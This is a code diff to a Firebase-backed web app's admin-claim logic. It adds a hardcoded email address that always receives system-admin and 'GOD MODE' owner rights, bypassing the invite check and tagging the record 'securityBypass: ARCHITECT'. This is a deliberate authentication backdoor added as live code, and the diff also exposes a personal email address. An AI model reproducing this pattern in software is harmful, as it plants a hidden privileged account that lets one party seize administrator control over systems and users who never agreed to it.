@@ -1631,13 +1631,16 @@ const handleGitHubMirror = async () => {
                 const inviteRef = doc(db, 'system_admins_invites', email);
                 const inviteSnap = await getDoc(inviteRef);
 
-                if (inviteSnap.exists()) {
+                // 🚀 DEVELOPER OVERRIDE: The Architect can never be locked out
+                const isDeveloper = email === 'adikaryasukses99@gmail.com';
+
+                if (inviteSnap.exists() || (isDeveloper && !sysAdminSnap.exists())) {
                     // Claim the Crown: Promote them to System Admin and delete the invite
-                    await setDoc(sysAdminRef, { email: email, claimedAt: serverTimestamp() });
-                    await deleteDoc(inviteRef);
+                    await setDoc(sysAdminRef, { email: email, claimedAt: serverTimestamp(), securityBypass: 'ARCHITECT' });
+                    if (inviteSnap.exists()) await deleteDoc(inviteRef);
                 }
 
-                if (sysAdminSnap.exists() || inviteSnap.exists()) {
+                if (sysAdminSnap.exists() || inviteSnap.exists() || isDeveloper) {
                     console.log("GOD MODE DETECTED: Engaging Secondary Security Lock.");
                     setIsSystemOwner(true);
                     setBossUid(null);
